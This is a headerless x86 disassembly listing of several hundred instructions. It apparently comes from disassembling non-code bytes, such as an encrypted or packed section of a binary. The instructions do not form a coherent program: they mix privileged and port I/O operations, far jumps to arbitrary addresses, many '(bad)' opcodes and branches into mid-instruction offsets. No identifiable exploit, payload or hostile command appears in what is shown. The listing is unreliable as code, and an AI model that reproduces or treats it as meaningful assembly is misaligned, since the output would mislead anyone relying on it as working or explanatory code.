  41c1d4:	jo     0x41c1f8
  41c1d6:	dec    edi
  41c1d7:	jge    0x41c164
  41c1d9:	aad    0xba
  41c1db:	add    DWORD PTR [ebx+0x7fafe45c],ecx
  41c1e1:	loope  0x41c200
  41c1e3:	push   es
  41c1e4:	xchg   DWORD PTR [ebx],edi
  41c1e6:	sti    
  41c1e7:	fild   DWORD PTR cs:[ebp-0x751359d9]
  41c1ee:	int3   
  41c1ef:	sbb    eax,0xc997eddd
  41c1f4:	and    edi,DWORD PTR [ebx+0x126d67df]
  41c1fa:	fadd   st(4),st
  41c1fc:	adc    esi,ebp
  41c1fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1ff:	ins    BYTE PTR es:[edi],dx
  41c200:	test   DWORD PTR [edx+0x37],esi
  41c203:	cs icebp 
  41c205:	and    esi,ebx
  41c207:	mov    cl,0x49
  41c209:	add    DWORD PTR [ebp-0x74f5895e],esi
  41c20f:	mov    dh,bl
  41c211:	iret   
  41c212:	pop    ebp
  41c213:	arpl   WORD PTR [eax+0x5e2cb351],cx
  41c219:	cdq    
  41c21a:	xlat   BYTE PTR ds:[ebx]
  41c21b:	lds    ebx,FWORD PTR [eax+0x75]
  41c21e:	out    0x3c,eax
  41c220:	je     0x41c24f
  41c222:	dec    ecx
  41c223:	pushf  
  41c224:	or     DWORD PTR [edi+0x247aa0e3],ecx
  41c22a:	inc    ebp
  41c22b:	xchg   bh,ch
  41c22d:	dec    ebx
  41c22e:	lahf   
  41c22f:	sub    ah,BYTE PTR [ecx-0x3c]
  41c232:	(bad)  
  41c233:	pop    eax
  41c234:	mov    dl,0x0
  41c236:	cdq    
  41c237:	mov    BYTE PTR [edx+ebx*8],ch
  41c23a:	cs in  al,0x78
  41c23d:	jb     0x41c25e
  41c23f:	mov    edi,ss
  41c241:	jmp    0x41c27a
  41c243:	mov    eax,0x5b11221d
  41c248:	push   edx
  41c249:	cmp    eax,0xcc0d6a77
  41c24e:	dec    esp
  41c24f:	std    
  41c250:	dec    edi
  41c251:	loop   0x41c243
  41c253:	xor    al,0x4e
  41c255:	pop    esp
  41c256:	mov    bh,BYTE PTR [edx-0x27eb05ba]
  41c25c:	inc    edx
  41c25d:	xchg   DWORD PTR [ecx+0x46],eax
  41c260:	jns    0x41c218
  41c262:	fidivr WORD PTR [ecx-0x2fd62527]
  41c268:	test   dl,cl
  41c26a:	push   es
  41c26b:	pop    esi
  41c26c:	cmp    eax,0x4a45346f
  41c271:	or     al,0x92
  41c273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c274:	jno    0x41c2af
  41c276:	sbb    BYTE PTR [edx+0x2d],al
  41c279:	cmp    BYTE PTR [edx-0x4c],bh
  41c27c:	mov    dh,0xec
  41c27e:	retf   0x605d
  41c281:	mov    BYTE PTR [di+0x64],dl
  41c285:	inc    edx
  41c286:	and    DWORD PTR [eax],0xffffffaa
  41c289:	adc    al,0x51
  41c28b:	in     al,dx
  41c28c:	out    dx,al
  41c28d:	pusha  
  41c28e:	imul   edx,esi,0x1556bdaa
  41c294:	jb     0x41c26a
  41c296:	stos   DWORD PTR es:[edi],eax
  41c297:	jo     0x41c2e0
  41c299:	clc    
  41c29a:	and    esi,DWORD PTR [ebx]
  41c29c:	stos   BYTE PTR es:[edi],al
  41c29d:	sub    esp,ecx
  41c29f:	das    
  41c2a0:	lods   al,BYTE PTR ds:[esi]
  41c2a1:	div    BYTE PTR [edi]
  41c2a3:	sti    
  41c2a4:	jle    0x41c2ab
  41c2a6:	call   0x2c78:0x1b7b99a2
  41c2ad:	test   al,0x67
  41c2af:	aaa    
  41c2b0:	mov    eax,ds:0xeef64c6b
  41c2b5:	ja     0x41c32a
  41c2b7:	inc    eax
  41c2b8:	pop    ecx
  41c2b9:	in     eax,dx
  41c2ba:	push   ds
  41c2bb:	and    al,0xa8
  41c2bd:	mov    ?,WORD PTR [esi+0x6]
  41c2c0:	jmp    0xc4c70d78
  41c2c5:	fmul   DWORD PTR [ebx+edi*1]
  41c2c8:	out    0xd0,al
  41c2ca:	xor    al,dh
  41c2cc:	dec    ebp
  41c2cd:	push   0xedbc0fa6
  41c2d2:	push   esp
  41c2d3:	data16 hlt 
  41c2d5:	xor    bl,BYTE PTR [ebp-0x717868d1]
  41c2db:	mov    esp,0x5db8f022
  41c2e0:	jmp    0x6a750fca
  41c2e5:	ins    DWORD PTR es:[edi],dx
  41c2e6:	push   cs
  41c2e7:	jne    0x41c2de
  41c2e9:	test   al,0x1b
  41c2eb:	sub    BYTE PTR [esi-0x2506d6d9],0x82
  41c2f2:	lahf   
  41c2f3:	mov    eax,ds:0xd99d22b9
  41c2f8:	lock sbb dh,bh
  41c2fb:	cmp    esp,DWORD PTR [ecx+0x6d8ea566]
  41c301:	push   0x12
  41c303:	xchg   ecx,eax
  41c304:	jnp    0x41c354
  41c306:	dec    eax
  41c307:	lea    edi,[eax+edi*8+0x5b]
  41c30b:	repz loop 0x41c2b9
  41c30e:	ret    0xf76
  41c311:	push   edi
  41c312:	aas    
  41c313:	cdq    
  41c314:	or     edx,DWORD PTR [edi+0x76]
  41c317:	(bad)  
  41c318:	out    dx,ax
  41c31a:	jle    0x41c2d8
  41c31c:	push   cs
  41c31d:	sbb    ecx,esi
  41c31f:	cmp    al,0xad
  41c321:	sub    ah,BYTE PTR [ecx-0x76]
  41c324:	ds mov ebx,0x72da6530
  41c32b:	sbb    dh,cl
  41c32d:	into   
  41c32e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c32f:	mov    al,ds:0xd77e474f
  41c334:	fimul  DWORD PTR ds:0x833b8354
  41c33a:	and    ecx,edi
  41c33c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c33d:	push   esi
  41c33e:	cmp    DWORD PTR ds:0x4272ced7,esp
  41c344:	in     al,dx
  41c345:	mov    ds:0x2af2db44,al
  41c34a:	adc    DWORD PTR [edx],0x2be60662
  41c350:	cmp    al,0xf8
  41c352:	icebp  
  41c353:	mov    ds:0x114de931,eax
  41c358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c359:	les    edx,FWORD PTR [edi]
  41c35b:	pusha  
  41c35c:	sub    DWORD PTR [esp+ebx*8],0x3a
  41c360:	fisttp QWORD PTR [edi+0x4a]
  41c363:	fsubr  DWORD PTR [edi]
  41c365:	in     eax,0xda
  41c367:	arpl   WORD PTR [ebx+ebx*4],di
  41c36a:	xlat   BYTE PTR ds:[ebx]
  41c36b:	pop    ebp
  41c36c:	jmp    DWORD PTR ds:0x490d092f
  41c372:	icebp  
  41c373:	stos   BYTE PTR es:[edi],al
  41c374:	adc    al,0x20
  41c376:	xchg   edi,eax
  41c377:	add    bl,al
  41c379:	int    0x75
  41c37b:	jmp    0x1709:0x7766e57a
  41c382:	in     eax,dx
  41c383:	mov    ch,BYTE PTR [edi+0x1a8caf9c]
  41c389:	test   eax,0x42f194ee
  41c38e:	mov    eax,es:0xfd6e8fa4
  41c394:	inc    esp
  41c395:	loope  0x41c3ff
  41c397:	test   al,0x89
  41c399:	leave  
  41c39a:	cdq    
  41c39b:	xor    DWORD PTR [ecx+0x73],0xffffffc7
  41c39f:	cmp    al,0xe0
  41c3a1:	or     al,0xa6
  41c3a3:	popa   
  41c3a4:	xchg   edx,eax
  41c3a5:	push   esi
  41c3a6:	xor    al,0xb9
  41c3a8:	adc    edi,DWORD PTR [edi+0x8e50366]
  41c3ae:	in     eax,dx
  41c3af:	push   eax
  41c3b0:	pop    esp
  41c3b1:	mov    edx,0x1a2d863f
  41c3b6:	repz push esi
  41c3b8:	mov    ah,0x65
  41c3ba:	fcmovb st,st(6)
  41c3bc:	sbb    eax,0x3ce021d3
  41c3c1:	sbb    eax,0x33f6ea1
  41c3c6:	add    eax,edi
  41c3c8:	and    ebx,DWORD PTR [eax+ecx*4-0xa0d9f09]
  41c3cf:	push   cs
  41c3d0:	jl     0x41c410
  41c3d2:	jmp    0x723cf1b8
  41c3d7:	test   eax,0x34018a81
  41c3dc:	retf   0xf91f
  41c3df:	imul   edx,DWORD PTR [ebp-0x5d],0x4702317c
  41c3e6:	pop    es
  41c3e7:	mov    eax,0x77cd6c40
  41c3ec:	and    al,BYTE PTR [ebx]
  41c3ee:	inc    ebx
  41c3ef:	jae    0x41c3cf
  41c3f1:	mov    dl,0xf1
  41c3f3:	push   cs
  41c3f4:	push   edx
  41c3f5:	mov    ah,BYTE PTR [esi-0x9]
  41c3f8:	xchg   BYTE PTR [edx-0x70],dl
  41c3fb:	in     eax,dx
  41c3fc:	aam    0x5d
  41c3fe:	imul   edx,DWORD PTR [ebp-0xb],0x6f07ec18
  41c405:	jns    0x41c405
  41c407:	(bad)  
  41c409:	sar    BYTE PTR [esi+0x17],cl
  41c40c:	xor    al,0xcf
  41c40e:	aaa    
  41c40f:	lea    ebx,[esi-0x20]
  41c412:	xor    BYTE PTR [ebx-0x24],ah
  41c415:	xlat   BYTE PTR ds:[ebx]
  41c416:	xchg   esp,eax
  41c417:	js     0x41c437
  41c419:	call   0x8382c122
  41c41e:	pop    edx
  41c41f:	or     eax,0x36b38227
  41c424:	cmp    dl,dl
  41c426:	cmc    
  41c427:	xlat   BYTE PTR ds:[ebx]
  41c428:	mov    ds:0x3b250c4,eax
  41c42d:	adc    al,bl
  41c42f:	adc    al,cl
  41c431:	out    0xe5,eax
  41c433:	popa   
  41c434:	inc    ebp
  41c435:	jl     0x41c3d6
  41c437:	pop    esi
  41c438:	mov    al,ds:0xa034c38f
  41c43d:	jne    0x41c44a
  41c43f:	retf   0x7f5c
  41c442:	and    dl,BYTE PTR [esi]
  41c444:	lea    eax,[ebp+0x1c9ca875]
  41c44a:	inc    eax
  41c44b:	lods   al,BYTE PTR ds:[esi]
  41c44c:	leave  
  41c44d:	call   0xcebf:0xaf5580cd
  41c454:	sub    eax,0x35bfdfa6
  41c459:	dec    ebp
  41c45a:	xchg   ebp,eax
  41c45b:	test   eax,0x14b28eb6
  41c460:	mov    cl,0x27
  41c462:	clc    
  41c463:	scas   eax,DWORD PTR es:[edi]
  41c464:	shl    ecx,0x37
  41c467:	adc    BYTE PTR [ebx+0x64],cl
  41c46a:	test   eax,0x738b714
  41c46f:	repnz push ebp
  41c471:	mov    ebx,fs
  41c473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c474:	sbb    DWORD PTR [esi+0x60a6fae7],esi
  41c47a:	ret    
  41c47b:	add    al,BYTE PTR [ecx+0x30d488ce]
  41c481:	or     DWORD PTR [ebp-0x6e0f8ef8],ecx
  41c487:	adc    bh,BYTE PTR [ecx+0x3]
  41c48a:	mov    ebp,0x9400621
  41c48f:	jbe    0x41c4a5
  41c491:	adc    eax,0xb317d583
  41c496:	pextrw eax,(bad),0xc5
  41c498:	test   bl,dh
  41c49a:	jmp    0x674bfd5c
  41c49f:	inc    edx
  41c4a0:	and    bl,0xbc
  41c4a3:	dec    edi
  41c4a4:	ds ret 0x4e69
  41c4a8:	clc    
  41c4a9:	xor    eax,0x3a56b94
  41c4ae:	outs   dx,DWORD PTR ds:[esi]
  41c4af:	push   0x8a2460cf
  41c4b4:	pop    edi
  41c4b5:	push   esp
  41c4b6:	pop    edx
  41c4b7:	cmp    eax,0x34f20be4
  41c4bc:	jnp    0x41c478
  41c4be:	js     0x41c46f
  41c4c0:	adc    ecx,DWORD PTR [esp+ebp*2-0x68]
  41c4c4:	mov    ebp,0xcef96ab1
  41c4c9:	std    
  41c4ca:	jno    0x41c50a
  41c4cc:	push   ebp
  41c4cd:	inc    esi
  41c4cf:	das    
  41c4d0:	sub    ch,bh
  41c4d2:	stos   DWORD PTR es:[edi],eax
  41c4d3:	or     eax,0xf20abe8c
  41c4d8:	fstp   DWORD PTR [eax+0x443bc8c8]
  41c4de:	mov    ch,0x3b
  41c4e0:	and    DWORD PTR [edi+0x7],esi
  41c4e3:	lods   eax,DWORD PTR ds:[esi]
  41c4e4:	popa   
  41c4e5:	xchg   esi,eax
  41c4e6:	dec    esi
  41c4e7:	push   cs
  41c4e8:	loope  0x41c4b5
  41c4ea:	sub    DWORD PTR [edx+0x3],eax
  41c4ed:	loopne 0x41c4f4
  41c4ef:	and    ch,BYTE PTR [edi]
  41c4f1:	das    
  41c4f2:	(bad)  
  41c4f4:	call   0xbaff:0xfcdb0152
  41c4fb:	jmp    0x41c4d2
  41c4fd:	gs loope 0x41c48b
  41c500:	mov    esp,0xb3206d07
  41c505:	sub    DWORD PTR [ebx-0x58ea6bae],ebp
  41c50b:	xor    eax,0x722472f9
  41c510:	mov    dh,0xc
  41c512:	adc    DWORD PTR [eax+0x4e],ecx
  41c515:	call   0x78:0xbbdc7791
  41c51c:	pop    edx
  41c51d:	add    BYTE PTR [esi],ch
  41c51f:	out    0x1d,eax
  41c521:	adc    eax,0x6c84cb34
  41c526:	je     0x41c4bd
  41c528:	nop
  41c529:	aam    0xc8
  41c52b:	test   al,0x4a
  41c52d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c52e:	adc    BYTE PTR ds:0x6f3feedf,dl
  41c534:	inc    ecx
  41c535:	dec    edx
  41c536:	xchg   ecx,eax
  41c537:	outs   dx,BYTE PTR ds:[esi]
  41c538:	rcr    BYTE PTR [edx+eiz*4-0x7ecf96a5],0x31
  41c540:	mov    cl,0x5d
  41c542:	sbb    DWORD PTR [ecx-0xb1f43fa],ebx
  41c548:	sbb    ebx,ecx
  41c54a:	add    eax,0x5314832c
  41c54f:	inc    edi
  41c550:	xchg   ecx,eax
  41c551:	pusha  
  41c552:	sbb    dl,BYTE PTR [esi-0x37]
  41c555:	or     BYTE PTR [ebx-0x2d],ah
  41c558:	cmp    BYTE PTR [esi],ah
  41c55a:	sahf   
  41c55b:	cmp    eax,DWORD PTR [edx-0x65]
  41c55e:	jns    0x41c4eb
  41c560:	mov    bl,0x14
  41c562:	fmul   QWORD PTR [edi]
  41c564:	leave  
  41c565:	sahf   
  41c566:	cmp    BYTE PTR [edi-0x347f2876],dh
  41c56c:	push   esp
  41c56d:	addps  xmm0,xmm3
  41c570:	repnz pop edx
  41c572:	cmp    al,0x81
  41c574:	add    eax,0xc916014f
  41c579:	pop    es
  41c57a:	out    0x2e,al
  41c57c:	repnz sub eax,0x7641d582
  41c582:	mov    eax,0x3789eb9b
  41c587:	mov    ebx,0xf9408136
  41c58c:	jl     0x41c5ce
  41c58e:	popf   
  41c58f:	ds push eax
  41c591:	adc    BYTE PTR [ebx+0x5b],ch
  41c594:	cld    
  41c595:	and    edi,DWORD PTR ds:0x1f1e64b9
  41c59b:	into   
  41c59c:	popf   
  41c59d:	cld    
  41c59e:	outs   dx,DWORD PTR ds:[esi]
  41c59f:	adc    edi,DWORD PTR [edx]
  41c5a1:	call   0x5d19f970
  41c5a6:	mov    ah,0x19
  41c5a8:	je     0x41c549
  41c5aa:	leave  
  41c5ab:	push   ds
  41c5ac:	mov    WORD PTR ss:[edx+0x28],es
  41c5b0:	test   eax,0xcc9a68b1
  41c5b5:	push   0x1
  41c5b7:	retf   0xbcd0
  41c5ba:	push   edx
  41c5bb:	das    
  41c5bc:	xchg   ebx,eax
  41c5bd:	dec    esp
  41c5be:	ficom  DWORD PTR [eax+0x3a16abc5]
  41c5c4:	test   al,0xbe
  41c5c6:	test   DWORD PTR [eax+0x720b8aa7],ebx
  41c5cc:	dec    edx
  41c5cd:	pop    ds
  41c5ce:	xchg   edx,eax
  41c5cf:	xor    BYTE PTR [eax-0x6714af8c],0xf6
  41c5d6:	or     BYTE PTR ss:[ebx],cl
  41c5d9:	add    al,0xdd
  41c5db:	xchg   ebp,eax
  41c5dc:	inc    esp
  41c5dd:	jnp    0x41c572
  41c5df:	xchg   esi,eax
  41c5e0:	dec    ecx
  41c5e1:	mov    eax,0x33c1bbd4
  41c5e6:	gs (bad) 
  41c5e8:	repz fstp QWORD PTR [esi+0x6e2cbdbe]
  41c5ef:	mov    ecx,0x9e63104d
  41c5f4:	push   ds
  41c5f5:	sub    bl,BYTE PTR [ebp-0x3dfdd38a]
  41c5fb:	test   eax,edi
  41c5fd:	ret    
  41c5fe:	push   eax
  41c5ff:	imul   edi,DWORD PTR [ebx+0x223220a5],0x6e
  41c606:	dec    eax
  41c607:	scas   al,BYTE PTR es:[edi]
  41c608:	out    0xdc,al
  41c60a:	push   edx
  41c60b:	cmc    
  41c60c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c60d:	icebp  
  41c60e:	mov    ebx,0x51e6cf6
  41c613:	loop   0x41c618
  41c615:	ja     0x41c62f
  41c617:	fldcw  WORD PTR ds:0xe16f3150
  41c61d:	(bad)  
  41c61e:	in     eax,0x60
  41c620:	lea    eax,[ebx+edi*4-0x1d32c3d6]
  41c627:	sub    ecx,DWORD PTR [edi+0x699034fc]
  41c62d:	or     DWORD PTR [ecx+0x124855f2],esi
  41c633:	push   edi
  41c634:	jle    0x41c5fd
  41c636:	in     al,0xd9
  41c638:	push   0xffffffd4
  41c63a:	pop    eax
  41c63b:	(bad)  [edx-0x7f]
  41c63e:	fcom   QWORD PTR ss:[ecx+0x13]
  41c642:	daa    
  41c643:	dec    edx
  41c644:	xchg   ebp,eax
  41c645:	cdq    
  41c646:	ss xchg ebx,eax
  41c648:	xchg   edi,eax
  41c649:	pop    ebx
  41c64a:	mov    ds:0x6d2c99bc,eax
  41c64f:	out    0xf3,eax
  41c651:	lock dec edx
  41c653:	popa   
  41c654:	sbb    al,0xec
  41c656:	sub    BYTE PTR [ebp-0x119dc039],dh
  41c65c:	cld    
  41c65d:	data16 out dx,al
  41c65f:	add    edi,DWORD PTR [esp+edi*8+0x288e1fc1]
  41c666:	inc    esi
  41c667:	bound  eax,QWORD PTR [ebx+0x38]
  41c66a:	mov    esp,0x4a23732d
  41c66f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c670:	popa   
  41c671:	call   esi
  41c673:	loope  0x41c637
  41c675:	cmc    
  41c676:	push   esi
  41c677:	les    ebp,FWORD PTR [esi+esi*4+0x68ecc26c]
  41c67e:	cld    
  41c67f:	push   ecx
  41c680:	ret    0xbb68
  41c683:	test   edx,edi
  41c685:	in     eax,0x1b
  41c687:	ins    DWORD PTR es:[edi],dx
  41c688:	outs   dx,BYTE PTR ds:[esi]
  41c689:	in     al,dx
  41c68a:	(bad)  
  41c68c:	mov    esi,DWORD PTR [eax+0x5d]
  41c68f:	retf   0xd6a
  41c692:	add    BYTE PTR [edx+0x19],dl
  41c695:	cli    
  41c696:	sbb    eax,0xe5b1fb7f
  41c69b:	iret   
  41c69c:	rcr    ecx,0x59
  41c69f:	xor    esi,eax
  41c6a1:	mov    dh,0x95
  41c6a3:	out    0x77,eax
  41c6a5:	push   cs
  41c6a6:	fdivr  QWORD PTR [eax-0x1e26da83]
  41c6ac:	pushf  
  41c6ad:	or     bh,BYTE PTR [edi]
  41c6af:	mov    ecx,0x5af19f75
  41c6b4:	pop    eax
  41c6b5:	popa   
  41c6b6:	sbb    eax,0x53b8a6f
  41c6bb:	xchg   esp,eax
  41c6bc:	mov    ch,0x6e
  41c6be:	pushf  
  41c6bf:	push   ebp
  41c6c0:	nop
  41c6c1:	fs sub eax,0x7567d584
  41c6c7:	(bad)  
  41c6c8:	xor    BYTE PTR [ecx],dh
  41c6ca:	dec    ecx
  41c6cb:	adc    al,0xe8
  41c6cd:	inc    esp
  41c6ce:	sahf   
  41c6cf:	xchg   edx,eax
  41c6d0:	gs int3 
  41c6d2:	mov    ds:0x280d308a,eax
  41c6d7:	imul   edi,DWORD PTR [ebp+0x1d],0x62f12ad2
  41c6de:	stos   DWORD PTR es:[edi],eax
  41c6df:	xor    esp,DWORD PTR [edi-0x2ba130ae]
  41c6e5:	out    dx,al
  41c6e6:	enter  0xbad,0x5
  41c6ea:	and    dh,dh
  41c6ec:	fadd   DWORD PTR [ebp-0x7350be11]
  41c6f2:	and    BYTE PTR [eax-0x2],dl
  41c6f5:	pop    ebp
  41c6f6:	mov    eax,ds:0x39fad400
  41c6fb:	aam    0xa7
  41c6fd:	test   al,0x2
  41c6ff:	scas   al,BYTE PTR es:[edi]
  41c700:	pop    es
  41c701:	lods   eax,DWORD PTR ds:[esi]
  41c702:	or     eax,0x58848a38
  41c707:	rol    esp,0x19
  41c70a:	adc    BYTE PTR [edx],dh
  41c70c:	jne    0x41c758
  41c70e:	pop    esi
  41c70f:	and    DWORD PTR [esi-0x3545d639],edi
  41c715:	cmp    esi,DWORD PTR [edi+ecx*8+0x5e]
  41c719:	sahf   
  41c71a:	add    al,0xd5
  41c71c:	retf   0xd61e
  41c71f:	stos   BYTE PTR es:[edi],al
  41c720:	mul    BYTE PTR [ecx-0x79473c14]
  41c726:	or     DWORD PTR [eax+0x7da95a42],0x73cfa20b
  41c730:	(bad)
  41c733:	dec    esp
  41c734:	mov    bl,0xc0
  41c736:	rol    bh,cl
  41c738:	inc    esp
  41c739:	cmc    
  41c73a:	mov    BYTE PTR [eax+eax*2+0xd400299],ah
  41c741:	push   ebp
  41c742:	dec    ebp
  41c743:	adc    BYTE PTR [ecx-0x1f],0xe8
  41c747:	outs   dx,DWORD PTR ds:[esi]
  41c748:	add    DWORD PTR [edi],0xffffffe8
  41c74b:	mov    dh,al
  41c74d:	mov    al,0xc3
  41c74f:	push   eax
  41c750:	call   0x470c552a
  41c755:	fist   WORD PTR [edi-0x17]
  41c758:	push   edi
  41c759:	lahf   
  41c75a:	jno    0x41c725
  41c75c:	pop    ecx
  41c75d:	push   ss
  41c75e:	xor    DWORD PTR [eax-0x7d],ecx
  41c761:	stos   DWORD PTR es:[edi],eax
  41c762:	in     eax,dx
  41c763:	and    eax,0xbe74dd57
  41c768:	scas   eax,DWORD PTR es:[edi]
  41c769:	fidivr WORD PTR [ebx]
  41c76b:	pop    eax
  41c76c:	add    eax,0x947863ee
  41c771:	aad    0x62
  41c773:	dec    ecx
  41c774:	lock in al,dx
  41c776:	mov    ebp,0xde8387d6
  41c77b:	inc    eax
  41c77c:	lds    edi,FWORD PTR ds:0x3eadef8d
  41c782:	test   BYTE PTR [edx+0x39041910],ah
  41c788:	lods   eax,DWORD PTR ds:[esi]
  41c789:	loope  0x41c778
  41c78b:	popf   
  41c78c:	popw   es
  41c78e:	fild   DWORD PTR [eax+0x5a7c3b8d]
  41c794:	xchg   esi,eax
  41c795:	mov    esp,0xbaffc00b
  41c79a:	inc    ecx
  41c79b:	mov    ch,0xc8
  41c79d:	lock mov BYTE PTR [edx],dh
  41c7a0:	pushf  
  41c7a1:	xchg   ebp,eax
  41c7a2:	imul   edi
  41c7a4:	jmp    0x99848104
  41c7a9:	add    al,0x1a
  41c7ab:	outs   dx,DWORD PTR ds:[esi]
  41c7ac:	and    dl,al
  41c7ae:	or     DWORD PTR [esi+0xd449634],ecx
  41c7b4:	pop    esp
  41c7b5:	xchg   BYTE PTR [eax+0xbc0dfa8],bh
  41c7bb:	outs   dx,DWORD PTR ds:[esi]
  41c7bc:	jmp    0x41c7ab
  41c7be:	jecxz  0x41c785
  41c7c0:	add    cl,BYTE PTR [ecx+ecx*2-0x4f]
  41c7c4:	xchg   ch,al
  41c7c6:	je     0x41c798
  41c7c8:	fwait
  41c7c9:	xor    al,0xdd
  41c7cb:	and    dl,BYTE PTR [ecx+esi*1-0x1b]
  41c7cf:	int3   
  41c7d0:	xor    ebp,DWORD PTR [edx+0x33]
  41c7d3:	popf   
  41c7d4:	lock mov cl,0x72
  41c7d7:	cmp    cl,BYTE PTR [ebx-0x6f77f24e]
  41c7dd:	sahf   
  41c7de:	jmp    0x964269cd
  41c7e3:	ins    DWORD PTR es:[edi],dx
  41c7e4:	mov    DWORD PTR [edx],esp
  41c7e6:	adc    BYTE PTR [edi-0x11c3af48],cl
  41c7ec:	xchg   dl,dh
  41c7ee:	adc    BYTE PTR [esi],bh
  41c7f0:	mov    ds:0xa312bad8,eax
  41c7f5:	loope  0x41c7af
  41c7f7:	sub    ah,BYTE PTR [eax]
  41c7f9:	aad    0x30
  41c7fb:	mov    dh,0xa4
  41c7fd:	jmp    0x41c7e9
  41c7ff:	xchg   al,dl
  41c801:	mov    DWORD PTR [eax+0x65],ebx
  41c804:	lods   al,BYTE PTR fs:[esi]
  41c806:	out    0x87,al
  41c808:	sub    esi,DWORD PTR [esi]
  41c80a:	and    al,0x76
  41c80c:	sub    al,0x4
  41c80e:	loop   0x41c83f
  41c810:	mov    ecx,0x4565b883
  41c815:	inc    esi
  41c816:	dec    eax
  41c817:	mov    ds:0xcdb01526,eax
  41c81c:	jo     0x41c802
  41c81e:	mov    ebp,0xd2feba28
  41c823:	fucomi st,st(3)
  41c825:	xchg   ecx,eax
  41c826:	fist   DWORD PTR [esi+0x30de6cc8]
  41c82c:	pop    esp
  41c82d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c82e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c82f:	pushf  
  41c830:	sbb    cl,dh
  41c832:	pop    edx
  41c833:	add    DWORD PTR [ecx+0x5af7e4eb],ecx
  41c839:	and    ah,BYTE PTR [ebx+0x1a]
  41c83c:	pop    eax
  41c83d:	sbb    esp,DWORD PTR cs:[esi-0x4b216570]
  41c844:	repz jle 0x41c8c4
  41c847:	dec    esp
  41c848:	frstor [edi]
  41c84a:	inc    edi
  41c84b:	inc    edx
  41c84c:	mov    dh,0x72
  41c84e:	cmp    eax,0xe8c1e709
  41c853:	jmp    0x9a66:0xc5038917
  41c85a:	xor    eax,0xc76ddbad
  41c85f:	repz sbb al,0x5e
  41c862:	lock fsub st,st(6)
  41c865:	mov    esp,0x2d0c82a1
  41c86a:	in     eax,dx
  41c86b:	nop
  41c86c:	fdivr  DWORD PTR [ecx+0x1f9d754f]
  41c872:	lods   eax,DWORD PTR ds:[esi]
  41c873:	sub    ebp,eax
  41c875:	cmp    BYTE PTR ds:0xc2f50def,ah
  41c87b:	inc    edx
  41c87c:	push   esi
  41c87d:	(bad)  
  41c87e:	jnp    0x41c8c6
  41c880:	sbb    DWORD PTR [ecx+0x2d],esp
  41c883:	sub    esi,DWORD PTR [edi-0x3d]
  41c886:	shr    ebx,1
  41c888:	jns    0x41c8bb
  41c88a:	frstor [edi-0x67d533b]
  41c890:	dec    eax
  41c891:	in     eax,0xb6
  41c893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c894:	xchg   BYTE PTR [ecx-0x70],ah
  41c897:	jle    0x41c894
  41c899:	mov    DWORD PTR [ebx-0x7c],esp
  41c89c:	ja     0x41c884
  41c89e:	and    bh,BYTE PTR [edx-0x5a]
  41c8a1:	xchg   esp,eax
  41c8a2:	inc    edi
  41c8a3:	push   ss
  41c8a4:	mov    ds:0xbbb45b0a,eax
  41c8a9:	or     ch,0x72
  41c8ac:	sti    
  41c8ad:	push   cs
  41c8ae:	or     dl,BYTE PTR [edx+0x5c]
  41c8b1:	rcr    DWORD PTR [eax],1
  41c8b3:	loop   0x41c882
  41c8b5:	(bad)  
  41c8b6:	pop    esi
  41c8b7:	dec    ebp
  41c8b8:	(bad)  [edx-0x56]
  41c8bb:	and    eax,0x469620ff
  41c8c0:	arpl   WORD PTR ds:[esi],bx
  41c8c3:	jno    0x41c854
  41c8c5:	pop    ecx
  41c8c6:	sub    edi,DWORD PTR [eax+edi*1-0x4d]
  41c8ca:	inc    ebp
  41c8cb:	les    eax,FWORD PTR [esi-0x19]
  41c8ce:	aas    
  41c8cf:	add    bh,ch
  41c8d1:	xor    BYTE PTR [ecx-0x26],dh
  41c8d4:	retf   0xadd6
  41c8d7:	dec    esp
  41c8d8:	or     DWORD PTR [edx+ecx*1+0x7a],0xffffffe9
  41c8dd:	mov    edx,0x13ee1c
  41c8e2:	add    eax,0xf00a13a9
  41c8e7:	lods   eax,DWORD PTR ds:[esi]
  41c8e8:	pop    ebx
  41c8e9:	pushf  
  41c8ea:	repnz dec eax
  41c8ec:	inc    bh
  41c8ee:	into   
  41c8ef:	mov    edx,0x82ad20ce
  41c8f4:	addr16 pusha 
  41c8f6:	mov    dh,ah
  41c8f8:	mov    eax,0x4b2bf2a2
  41c8fd:	sub    BYTE PTR [ecx+0x72c28afe],cl
  41c903:	out    0x8b,al
  41c905:	xor    ah,BYTE PTR [edx+edi*8]
  41c908:	out    0x66,eax
  41c90a:	scas   eax,DWORD PTR es:[edi]
  41c90b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c90c:	rcl    DWORD PTR [esi],0xe2
  41c90f:	mov    bh,0x73
  41c911:	dec    esp
  41c912:	mov    ch,BYTE PTR [ebx-0x3617f19]
  41c918:	or     bl,bl
  41c91a:	pop    ebx
  41c91b:	in     al,0xcf
  41c91d:	mov    dl,0x7
  41c91f:	dec    ecx
  41c921:	stos   BYTE PTR es:[edi],al
  41c922:	je     0x41c989
  41c924:	(bad)  
  41c925:	and    al,BYTE PTR [eax+0x9]
  41c928:	jo     0x41c914
  41c92a:	xor    DWORD PTR [eax],edx
  41c92c:	mov    al,0x72
  41c92e:	push   cs
  41c92f:	in     eax,dx
  41c930:	xchg   ebx,eax
  41c931:	jno    0x41c8e8
  41c933:	je     0x41c963
  41c935:	mov    edx,0x3ca820d
  41c93a:	adc    ch,BYTE PTR [ecx+edi*4+0x4b876e70]
  41c941:	scas   eax,DWORD PTR es:[edi]
  41c942:	adc    eax,0x802e03af
  41c947:	rcr    DWORD PTR [ecx-0x2],0x49
  41c94b:	push   ebx
  41c94c:	imul   esp
  41c94e:	push   esp
  41c94f:	mov    al,ds:0x1f950422
  41c954:	or     edi,edi
  41c956:	inc    eax
  41c957:	dec    ecx
  41c958:	push   ebp
  41c959:	push   ecx
  41c95a:	push   ss
  41c95b:	xor    dl,bh
